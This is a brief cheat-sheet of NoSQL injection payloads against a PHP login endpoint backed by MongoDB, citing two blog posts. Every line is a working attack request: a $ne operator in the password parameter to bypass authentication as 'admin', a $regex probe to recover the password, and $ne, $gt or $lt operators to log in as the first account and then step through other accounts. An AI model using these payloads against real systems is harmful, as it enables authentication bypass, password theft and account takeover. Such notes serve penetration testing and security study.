login.php?username=admin&password[$ne]=bar (https://www.idontplaydarts.com/2010/07/mongodb-is-vulnerable-to-sql-injection-in-php-at-least/, http://blog.imperva.com/2014/10/nosql-ssji-authentication-bypass.html)
login.php?username=admin&password[$regex]=^P4ss to recover pw

login.php?username[$ne]=foo&password[$ne]=bar will login as first account e.g. frank
login.php?username[$gt]=frank&password[$ne]=bar to login as other accounst (or use $lt to go the other direction)
